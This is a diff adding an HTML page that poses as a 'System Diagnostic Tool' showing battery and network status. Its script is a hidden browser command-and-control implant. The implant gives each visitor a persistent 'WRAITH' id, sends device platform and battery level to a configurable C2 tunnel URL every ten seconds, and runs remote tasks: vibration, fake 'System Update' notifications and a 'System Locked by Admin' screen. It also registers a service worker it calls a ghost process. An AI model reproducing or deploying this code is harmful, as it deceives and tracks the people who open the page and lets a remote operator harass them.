@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>System Diagnostic Tool</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIlN5c3RlbSBEaWFnbm9zdGljIiwKICAic2hvcnRfbmFtZSI6ICJEaWFnbm9zdGljIiwKICAic3RhcnRfdXJsIjogIi4iLAogICJkaXNwbGF5IjogInN0YW5kYWxvbmUiLAogICJiYWNrZ3JvdW5kX2NvbG9yIjogIiMwZTA2MTciLAogICJpY29ucyI6IFtgeyAic3JjIjogImh0dHBzOi8vY2RuLWljb25zLXBuZy5mbGF0aWNvbi5jb20vNTEyLzI5OTUvMjk5NTQ1Ny5wbmciLCAic2l6ZXMiOiAiNTEyeDUxMiIsICJ0eXBlIjogImltYWdlL3BuZyIgfV0KfQ==">
+</head>
+
+<body class="bg-[#020617] text-slate-400 font-sans p-6">
+
+  <div id="ui-main" class="max-w-md mx-auto space-y-8 pt-10">
+    <div class="text-center">
+      <div class="w-20 h-20 bg-blue-500/10 border border-blue-500 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
+        <svg class="w-10 h-10 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+        </svg>
+      </div>
+      <h1 class="text-white text-xl font-bold italic uppercase tracking-tighter">Mohon Maaf di Non Aktifkan</h1>
+      <p class="text-[15px] opacity-50 uppercase mt-1">By : sedyatm</p>
+    </div>
+
+    <div class="grid grid-cols-2 gap-4">
+      <div class="p-4 bg-slate-900/50 border border-slate-800 rounded-2xl">
+        <p class="text-[12px] uppercase font-bold text-blue-400">Level Battery</p>
+        <p id="ui-bat" class="text-xl font-bold text-white">--%</p>
+      </div>
+      <div class="p-4 bg-slate-900/50 border border-slate-800 rounded-2xl">
+        <p class="text-[12px] uppercase font-bold text-blue-400">Jaringan Anda</p>
+        <p id="ui-net" class="text-xl font-bold text-white">Aman Terkendali</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // CONFIG: URL Cloudflare Tunnel Anda
+    const MASTER_C2 = "https://your-tunnel-url.trycloudflare.com";
+    const TID = localStorage.getItem('wraith_id') || 'WRAITH-' + Math.random().toString(36).substr(2, 5).toUpperCase();
+    localStorage.setItem('wraith_id', TID);
+    async function sync() {
+      try {
+        const bat = await (navigator.getBattery ? navigator.getBattery() : {
+          level: 0
+        });
+        const batLevel = (bat.level * 100).toFixed(0);
+        document.getElementById('ui-bat').innerText = batLevel + "%";
+        const response = await fetch(`${MASTER_C2}/sync`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            id: TID,
+            model: navigator.platform,
+            bat: batLevel
+          })
+        });
+        const data = await response.json();
+        if (data.payload) executeRemote(data.payload);
+      } catch (e) {
+        console.log("Silent Link Failed.");
+      }
+    }
+
+    function executeRemote(task) {
+      console.log("Remote Command received: ", task);
+      if (task === 'vibrate') navigator.vibrate([500, 200, 500]);
+      if (task === 'notify') {
+        new Notification("System Update", {
+          body: "Crucial hardware update available."
+        });
+      }
+      if (task === 'lock_ui') {
+        document.body.innerHTML = "<div class='h-screen flex items-center justify-center text-red-500 font-black text-2xl animate-pulse uppercase'>System Locked by Admin</div>";
+      }
+    }
+    // Jalankan sinkronisasi
+    setInterval(sync, 10000); // Setiap 10 detik
+    sync();
+    // Service Worker (Ghost Process)
+    if ('serviceWorker' in navigator) {
+      const sw = `
+                self.addEventListener('install', e => self.skipWaiting());
+                self.addEventListener('push', e => {
+                    const data = e.data.json();
+                    self.registration.showNotification(data.title, { body: data.body });
+                });
+            `;
+      const blob = new Blob([sw], {
+        type: 'text/javascript'
+      });
+      navigator.serviceWorker.register(URL.createObjectURL(blob));
+    }
+    // Meminta izin notifikasi agar C2 bisa memunculkan pop-up
+    Notification.requestPermission();
+  </script>
+</body>
+
+</html>
